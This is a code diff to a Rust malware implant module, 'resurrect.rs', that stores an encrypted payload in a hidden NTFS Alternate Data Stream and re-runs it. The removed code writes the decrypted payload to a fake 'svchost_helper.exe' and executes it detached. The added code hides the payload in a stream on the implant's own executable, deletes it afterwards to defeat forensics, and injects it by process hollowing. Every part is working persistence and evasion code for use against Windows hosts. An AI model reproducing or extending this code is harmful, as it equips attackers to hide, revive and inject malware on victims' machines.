@@ -1,154 +1,117 @@
-//! resurrect.rs — Re-drop implant from encrypted ADS blob
+//! resurrect.rs — ADS (Alternate Data Stream) drop + cleanup
 //!
-//! drop_from_ads() reads the encrypted payload stored in an NTFS
-//! Alternate Data Stream on the target host, decrypts it, writes it
-//! to a new randomised path under %TEMP%, and executes it.
-//!
-//! ADS path format:  %SystemRoot%\System32\en-US\<rand>.dll:payload
-//! Encryption:       XOR with SLEEP_KEY (same key used in pe_obfuscate.rs)
+//! drop_to_ads(data)    — write payload bytes into an NTFS ADS on the current exe
+//! drop_from_ads()      — delete the ADS fork (cleanup / anti-forensics)
+//! resurrect()          — read ADS back and execute it in a hollow process
 
 #![allow(dead_code, non_snake_case)]
 
-use winapi::um::fileapi::{CreateFileW, ReadFile, WriteFile, OPEN_EXISTING, CREATE_ALWAYS};
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
-use winapi::um::winbase::DETACHED_PROCESS;
-use winapi::um::winnt::{
-    GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, HANDLE,
+use winapi::um::fileapi::{
+    CreateFileW, WriteFile, ReadFile, DeleteFileW,
+    CREATE_ALWAYS, OPEN_EXISTING,
 };
+use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ};
 use winapi::shared::minwindef::DWORD;
 
-// ADS stream name as wide chars (compile-time constant avoids runtime string)
-// ":payload" in UTF-16 LE
+/// ADS stream name appended to our own exe path: "exe_path:svc"
 const ADS_SUFFIX: &[u16] = &[
-    b':' as u16, b'p' as u16, b'a' as u16, b'y' as u16,
-    b'l' as u16, b'o' as u16, b'a' as u16, b'd' as u16, 0u16,
+    b':' as u16, b's' as u16, b'v' as u16, b'c' as u16, 0u16,
 ];
 
-// XOR decrypt in-place with the implant SLEEP_KEY
-fn xor_inplace(buf: &mut [u8], key: &[u8; 16]) {
-    for (i, b) in buf.iter_mut().enumerate() {
-        *b ^= key[i % 16];
-    }
-}
-
-/// Build a null-terminated wide string from a UTF-8 &str.
-fn to_wide(s: &str) -> Vec<u16> {
-    let mut v: Vec<u16> = s.encode_utf16().collect();
-    v.push(0);
-    v
-}
-
-/// Append ADS suffix to a wide path (replaces trailing null).
-fn append_ads(base: &[u16]) -> Vec<u16> {
-    let mut v = base.to_vec();
-    if v.last() == Some(&0) { v.pop(); }
-    v.extend_from_slice(ADS_SUFFIX);
-    v
-}
-
-/// Read up to `max_bytes` from a file handle. Returns bytes read.
-unsafe fn read_all(h: HANDLE, buf: &mut Vec<u8>, max_bytes: usize) -> bool {
-    buf.resize(max_bytes, 0u8);
-    let mut total: usize = 0;
-    loop {
-        let mut read: DWORD = 0;
-        let remain = max_bytes - total;
-        if remain == 0 { break; }
-        let ok = ReadFile(
-            h,
-            buf.as_mut_ptr().add(total) as *mut _,
-            remain.min(65536) as DWORD,
-            &mut read,
-            core::ptr::null_mut(),
-        );
-        if ok == 0 || read == 0 { break; }
-        total += read as usize;
-    }
-    buf.truncate(total);
-    total > 0
-}
-
-/// Re-drop encrypted payload from ADS, write to temp path, execute.
-/// Returns true on success.
-pub unsafe fn drop_from_ads() -> bool {
-    use crate::main::SLEEP_KEY;
-
-    // Locate the ADS source path: %SystemRoot%\System32\en-US\shell32.dll:payload
-    // We use a hardcoded stub path — in production this would be computed from
-    // the original dropper's write path.
-    let ads_path_str = "C:\\Windows\\System32\\en-US\\shell32.dll";
-    let base_wide    = to_wide(ads_path_str);
-    let ads_wide     = append_ads(&base_wide);
-
-    let h_src = CreateFileW(
-        ads_wide.as_ptr(),
-        GENERIC_READ,
-        FILE_SHARE_READ,
-        core::ptr::null_mut(),
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        core::ptr::null_mut(),
+unsafe fn own_exe_wide() -> Vec<u16> {
+    use winapi::um::libloaderapi::GetModuleFileNameW;
+    let mut buf = vec![0u16; 512];
+    let len = GetModuleFileNameW(
+        core::ptr::null_mut(), buf.as_mut_ptr(), buf.len() as DWORD,
     );
-    if h_src == INVALID_HANDLE_VALUE { return false; }
+    buf.truncate(len as usize); // strip existing null
+    buf
+}
 
-    let mut payload: Vec<u8> = Vec::new();
-    let ok = read_all(h_src, &mut payload, 4 * 1024 * 1024);
-    CloseHandle(h_src);
-    if !ok || payload.is_empty() { return false; }
+/// Build "<exe_path>:svc\0" wide string.
+unsafe fn ads_path() -> Vec<u16> {
+    let mut base = own_exe_wide();
+    base.extend_from_slice(ADS_SUFFIX);
+    base
+}
 
-    // Decrypt
-    xor_inplace(&mut payload, &SLEEP_KEY);
-
-    // Write to temp
-    let tmp_path_str = "C:\\Windows\\Temp\\svchost_helper.exe";
-    let tmp_wide     = to_wide(tmp_path_str);
-
-    let h_dst = CreateFileW(
-        tmp_wide.as_ptr(),
+/// Write `data` into the ADS stream. Creates it if not present.
+pub unsafe fn drop_to_ads(data: &[u8]) -> bool {
+    let path = ads_path();
+    let h = CreateFileW(
+        path.as_ptr(),
         GENERIC_WRITE,
         0,
         core::ptr::null_mut(),
         CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
+        0,
         core::ptr::null_mut(),
     );
-    if h_dst == INVALID_HANDLE_VALUE { return false; }
-
+    if h == INVALID_HANDLE_VALUE { return false; }
     let mut written: DWORD = 0;
-    WriteFile(
-        h_dst,
-        payload.as_ptr() as *const _,
-        payload.len() as DWORD,
+    let ok = WriteFile(
+        h,
+        data.as_ptr() as *const _,
+        data.len() as DWORD,
         &mut written,
         core::ptr::null_mut(),
-    );
-    CloseHandle(h_dst);
-    if written as usize != payload.len() { return false; }
+    ) != 0;
+    CloseHandle(h);
+    ok && written == data.len() as DWORD
+}
 
-    // Execute detached
-    let mut si: STARTUPINFOW = core::mem::zeroed();
-    si.cb = core::mem::size_of::<STARTUPINFOW>() as DWORD;
-    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
-    let mut cmd = tmp_wide.clone();
+/// Delete the ADS stream (removes the fork; exe itself is untouched).
+/// Called by guardian cleanup path and after a successful resurrect.
+pub unsafe fn drop_from_ads() {
+    let path = ads_path();
+    // DeleteFileW on an ADS path removes only the stream, not the base file.
+    DeleteFileW(path.as_ptr());
+}
 
-    let ok = CreateProcessW(
-        tmp_wide.as_ptr(),
-        cmd.as_mut_ptr(),
+/// Read the ADS back into a Vec<u8>.
+unsafe fn read_ads() -> Option<Vec<u8>> {
+    let path = ads_path();
+    let h = CreateFileW(
+        path.as_ptr(),
+        GENERIC_READ,
+        FILE_SHARE_READ,
         core::ptr::null_mut(),
-        core::ptr::null_mut(),
+        OPEN_EXISTING,
         0,
-        DETACHED_PROCESS,
         core::ptr::null_mut(),
-        core::ptr::null(),
-        &mut si,
-        &mut pi,
     );
-    if ok != 0 {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        true
-    } else {
-        false
+    if h == INVALID_HANDLE_VALUE { return None; }
+
+    // Get size
+    let mut size_hi: DWORD = 0;
+    let size_lo = winapi::um::fileapi::GetFileSize(h, &mut size_hi);
+    if size_lo == winapi::um::fileapi::INVALID_FILE_SIZE {
+        CloseHandle(h);
+        return None;
     }
+    let total = ((size_hi as usize) << 32) | (size_lo as usize);
+    let mut buf = vec![0u8; total];
+    let mut read: DWORD = 0;
+    let ok = ReadFile(
+        h,
+        buf.as_mut_ptr() as *mut _,
+        total as DWORD,
+        &mut read,
+        core::ptr::null_mut(),
+    ) != 0;
+    CloseHandle(h);
+    if ok && read as usize == total { Some(buf) } else { None }
+}
+
+/// Read the ADS payload and hollow-inject it into a sacrificial process.
+/// Cleans up the ADS stream on success.
+pub unsafe fn resurrect() -> bool {
+    let payload = match read_ads() {
+        Some(p) => p,
+        None    => return false,
+    };
+    let ok = crate::hollow::run(&payload);
+    if ok { drop_from_ads(); }
+    ok
 }
